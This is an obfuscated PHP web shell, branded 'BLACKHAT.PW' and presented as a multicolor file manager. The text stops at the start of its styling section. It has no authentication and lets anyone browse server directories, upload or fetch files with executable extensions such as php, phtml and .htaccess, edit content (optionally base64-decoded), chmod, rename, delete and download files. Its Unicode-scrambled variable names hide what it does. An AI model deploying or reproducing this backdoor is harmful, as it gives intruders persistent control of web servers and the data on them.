/*
=========================================================
 BLACKHAT.PW — Hackerone MULTICOLOR FILE MANAGER
 Colors:
 Yellow / Blue / Gold / Red / Green
=========================================================
*/

function hex_encode($㼁ᛈᛃ㌁̥̀̃){
    return bin2hex($㼁ᛈᛃ㌁̥̀̃);
}

function hex_decode($㼁ᛈᛃ㌁̥̀̃){

    if (
        !is_string($㼁ᛈᛃ㌁̥̀̃) ||
        $㼁ᛈᛃ㌁̥̀̃ === '' ||
        (strlen($㼁ᛈᛃ㌁̥̀̃) % 2) !== 0 ||
        !ctype_xdigit($㼁ᛈᛃ㌁̥̀̃)
    ) {
        return false;
    }

    return hex2bin($㼁ᛈᛃ㌁̥̀̃);
}

function url_path($ﬆ㉉ら̨㲁̩̀){
    return urlencode(hex_encode($ﬆ㉉ら̨㲁̩̀));
}

function perms($ᛈ̧̊ᛉ㌁̈̄){
    return substr(sprintf('%o', @fileperms($ᛈ̧̊ᛉ㌁̈̄)), -4);
}


/* =========================================================
   CURRENT DIRECTORY
========================================================= */

$㉆ㄉ̇ = isset($_GET['p'])
    ? hex_decode($_GET['p'])
    : __DIR__;

$ᛇぁ̣́̈ = $㉆ㄉ̇
    ? realpath($㉆ㄉ̇)
    : __DIR__;

if (!$ᛇぁ̣́̈ || !is_dir($ᛇぁ̣́̈)) {
    $ᛇぁ̣́̈ = __DIR__;
}


/* =========================================================
   SAFE URL UPLOAD CONFIG
========================================================= */

/*
 * Ganti dengan domain yang memang kamu izinkan.
 */
$ね̧́̅ = [
    'example.com',
    'raw.githubusercontent.com'
];

$ᚢ̆̆̀㈲̧ = [
  'php',
   '.htaccess',
  'phtml',
 'config',
 'shtml',
 'html',
    'txt',
    'jpg',
    'jpeg',
    'png',
    'gif',
    'webp',
    'pdf',
    'zip'
];

$ﬓ̣̅̌̆̉ = 10 * 1024 * 1024;

$ぁᚦぁᛗ̤̋̇ = '';
$ᛃ㼁̋̈ = '';


/* =========================================================
   STANDARD UPLOAD
========================================================= */

if (
    !empty($_FILES['f']['name']) &&
    (
        isset($_POST['up']) ||
        isset($_POST['up_stream'])
    )
) {

    $ᛇ̧̃̀̄ = $ᛇぁ̣́̈ . '/' . basename($_FILES['f']['name']);

    if (isset($_POST['up_stream'])) {

        $ﬖ̨ﬗ́̊ = @fopen(
            $_FILES['f']['tmp_name'],
            'rb'
        );

        $ᛜ̄ᚢ̀ぁ̧̦̆ = @fopen(
            $ᛇ̧̃̀̄,
            'wb'
        );

        if ($ﬖ̨ﬗ́̊ && $ᛜ̄ᚢ̀ぁ̧̦̆) {
            stream_copy_to_stream(
                $ﬖ̨ﬗ́̊,
                $ᛜ̄ᚢ̀ぁ̧̦̆
            );
        }

        if ($ﬖ̨ﬗ́̊) {
            fclose($ﬖ̨ﬗ́̊);
        }

        if ($ᛜ̄ᚢ̀ぁ̧̦̆) {
            fclose($ᛜ̄ᚢ̀ぁ̧̦̆);
        }

    } else {

        move_uploaded_file(
            $_FILES['f']['tmp_name'],
            $ᛇ̧̃̀̄
        );
    }

    header(
        'Location: ?p=' . url_path($ᛇぁ̣́̈)
    );

    exit;
}


/* =========================================================
   CREATE FILE
========================================================= */

if (
    isset($_POST['new']) &&
    trim($_POST['n'])
) {

    $㌁㻁ねﬁᛚ̥̆ = basename(
        trim($_POST['n'])
    );

    file_put_contents(
        $ᛇぁ̣́̈ . '/' . $㌁㻁ねﬁᛚ̥̆,
        ''
    );

    header(
        'Location: ?p=' . url_path($ᛇぁ̣́̈)
    );

    exit;
}


/* =========================================================
   CREATE DIRECTORY
========================================================= */

if (
    isset($_POST['mkdir']) &&
    trim($_POST['d'])
) {

    $㌁㻁ねﬁᛚ̥̆ = basename(
        trim($_POST['d'])
    );

    @mkdir(
        $ᛇぁ̣́̈ . '/' . $㌁㻁ねﬁᛚ̥̆
    );

    header(
        'Location: ?p=' . url_path($ᛇぁ̣́̈)
    );

    exit;
}


/* =========================================================
   UPLOAD FROM URL
========================================================= */

if (
    isset($_POST['url']) &&
    isset($_POST['filename']) &&
    isset($_POST['method'])
) {

    $㲁ᚢ̉̉ = trim($_POST['url']);

    $㉆̥̄ﬁ̩̆ = basename(
        trim($_POST['filename'])
    );

    $ﬁᛈ̆̇ =
        $ᛇぁ̣́̈ . '/' . $㉆̥̄ﬁ̩̆;

    $ﬖﬅ̩̤́̃̋̀ = parse_url($㲁ᚢ̉̉);

    $ᛚ̨ᛖ̇̇̊ = strtolower(
        $ﬖﬅ̩̤́̃̋̀['scheme'] ?? ''
    );

    $ᛈ̌㦁̨ = strtolower(
        $ﬖﬅ̩̤́̃̋̀['host'] ?? ''
    );

    $ᛗ̥̅̈ = false;

    foreach ($ね̧́̅ as $ら̧̧̤̄) {

        $ら̧̧̤̄ = strtolower(
            trim($ら̧̧̤̄)
        );

        if (
            $ᛈ̌㦁̨ === $ら̧̧̤̄ ||
            str_ends_with(
                $ᛈ̌㦁̨,
                '.' . $ら̧̧̤̄
            )
        ) {
            $ᛗ̥̅̈ = true;
            break;
        }
    }


    /* URL validation */

    if (
        !filter_var(
            $㲁ᚢ̉̉,
            FILTER_VALIDATE_URL
        )
    ) {

        $ぁᚦぁᛗ̤̋̇ =
            'URL tidak valid.';

        $ᛃ㼁̋̈ =
            'error';

    }

    /* HTTPS only */

    elseif ($ᛚ̨ᛖ̇̇̊ !== 'https') {

        $ぁᚦぁᛗ̤̋̇ =
            'Hanya HTTPS yang diizinkan.';

        $ᛃ㼁̋̈ =
            'error';

    }

    /* Domain whitelist */

    elseif (!$ᛗ̥̅̈) {

        $ぁᚦぁᛗ̤̋̇ =
            'Domain tidak diizinkan.';

        $ᛃ㼁̋̈ =
            'error';

    }

    /* Filename validation */

    elseif (
        $㉆̥̄ﬁ̩̆ === '' ||
        $㉆̥̄ﬁ̩̆ === '.' ||
        $㉆̥̄ﬁ̩̆ === '..'
    ) {

        $ぁᚦぁᛗ̤̋̇ =
            'Nama file tidak valid.';

        $ᛃ㼁̋̈ =
            'error';

    }

    else {

        $ﬓ̀̀̈ = strtolower(
            pathinfo(
                $㉆̥̄ﬁ̩̆,
                PATHINFO_EXTENSION
            )
        );


        /* Extension whitelist */

        if (
            !in_array(
                $ﬓ̀̀̈,
                $ᚢ̆̆̀㈲̧,
                true
            )
        ) {

            $ぁᚦぁᛗ̤̋̇ =
                'Ekstensi file tidak diizinkan.';

            $ᛃ㼁̋̈ =
                'error';

        }

        else {

            /*
             * Hanya satu metode yang digunakan
             * pada versi aman ini.
             */

            $㉉ᛉ̈́ =
                stream_context_create([
                    'http' => [
                        'method' => 'GET',
                        'timeout' => 20,
                        'follow_location' => 0
                    ],
                    'https' => [
                        'method' => 'GET',
                        'timeout' => 20,
                        'follow_location' => 0
                    ]
                ]);

            $㼁ね̅̀ﾝ̃́ = @file_get_contents(
                $㲁ᚢ̉̉,
                false,
                $㉉ᛉ̈́
            );


            if ($㼁ね̅̀ﾝ̃́ === false) {

                $ぁᚦぁᛗ̤̋̇ =
                    'Download dari URL gagal.';

                $ᛃ㼁̋̈ =
                    'error';

            }

            elseif (
                strlen($㼁ね̅̀ﾝ̃́) >
                $ﬓ̣̅̌̆̉
            ) {

                $ぁᚦぁᛗ̤̋̇ =
                    'File melebihi batas 10 MB.';

                $ᛃ㼁̋̈ =
                    'error';

            }

            elseif (
                @file_put_contents(
                    $ﬁᛈ̆̇,
                    $㼁ね̅̀ﾝ̃́
                ) === false
            ) {

                $ぁᚦぁᛗ̤̋̇ =
                    'Gagal menyimpan file.';

                $ᛃ㼁̋̈ =
                    'error';

            }

            else {

                $ぁᚦぁᛗ̤̋̇ =
                    'File berhasil di-upload dari URL.';

                $ᛃ㼁̋̈ =
                    'success';
            }
        }
    }
}


/* =========================================================
   RENAME
========================================================= */

if (
    isset($_POST['ren']) &&
    isset($_POST['old'], $_POST['new'])
) {

    $㉉ᚢ̦ = basename(
        $_POST['old']
    );

    $ᛚ̄㉆ﬕﬔ̣ = basename(
        $_POST['new']
    );

    @rename(
        $ᛇぁ̣́̈ . '/' . $㉉ᚢ̦,
        $ᛇぁ̣́̈ . '/' . $ᛚ̄㉆ﬕﬔ̣
    );

    header(
        'Location: ?p=' . url_path($ᛇぁ̣́̈)
    );

    exit;
}


/* =========================================================
   CHMOD
========================================================= */

if (
    isset($_POST['chmod']) &&
    isset($_POST['t'], $_POST['m'])
) {

    $ᛇ̧̃̀̄ = basename(
        $_POST['t']
    );

    $ᚢᛚ̣ᛇﬗ̆̀̇ = $_POST['m'];

    if (preg_match(
        '/^[0-7]{3,4}$/',
        $ᚢᛚ̣ᛇﬗ̆̀̇
    )) {

        @chmod(
            $ᛇぁ̣́̈ . '/' . $ᛇ̧̃̀̄,
            octdec($ᚢᛚ̣ᛇﬗ̆̀̇)
        );
    }

    header(
        'Location: ?p=' . url_path($ᛇぁ̣́̈)
    );

    exit;
}


/* =========================================================
   DELETE
========================================================= */

if (isset($_GET['del'])) {

    $ᛇ̧̃̀̄ = basename(
        $_GET['del']
    );

    $㌁́̅ =
        $ᛇぁ̣́̈ . '/' . $ᛇ̧̃̀̄;

    if (is_file($㌁́̅)) {

        @unlink($㌁́̅);

    } elseif (is_dir($㌁́̅)) {

        @rmdir($㌁́̅);
    }

    header(
        'Location: ?p=' . url_path($ᛇぁ̣́̈)
    );

    exit;
}


/* =========================================================
   DOWNLOAD
========================================================= */

if (isset($_GET['dl'])) {

    $ﬓ㻁㲁̩̌ = basename(
        $_GET['dl']
    );

    $ᛈ̧̊ᛉ㌁̈̄ = $ᛇぁ̣́̈ . '/' . $ﬓ㻁㲁̩̌;

    if (is_file($ᛈ̧̊ᛉ㌁̈̄)) {

        header(
            'Content-Type: application/octet-stream'
        );

        header(
            'Content-Disposition: attachment; filename="' .
            basename($ᛈ̧̊ᛉ㌁̈̄) .
            '"'
        );

        header(
            'Content-Length: ' .
            filesize($ᛈ̧̊ᛉ㌁̈̄)
        );

        readfile($ᛈ̧̊ᛉ㌁̈̄);

        exit;
    }
}


/* =========================================================
   SAVE EDITED FILE
========================================================= */

if (
    isset($_POST['save']) &&
    isset($_POST['file'])
) {

    $ﬓ㻁㲁̩̌ = basename(
        $_POST['file']
    );

    $ﬅﬅ̈̆ =
        $_POST['content'] ?? '';

    if (
        isset($_POST['content_b64']) &&
        $_POST['content_b64'] !== ''
    ) {

        $ﬆᚨᛏﬁ̤́̆̇ =
            base64_decode(
                $ﬅﬅ̈̆,
                true
            );

        if ($ﬆᚨᛏﬁ̤́̆̇ !== false) {
            $ﬅﬅ̈̆ = $ﬆᚨᛏﬁ̤́̆̇;
        }
    }

    file_put_contents(
        $ᛇぁ̣́̈ . '/' . $ﬓ㻁㲁̩̌,
        $ﬅﬅ̈̆
    );

    header(
        'Location: ?p=' . url_path($ᛇぁ̣́̈)
    );

    exit;
}


/* =========================================================
   Hackerone CSS
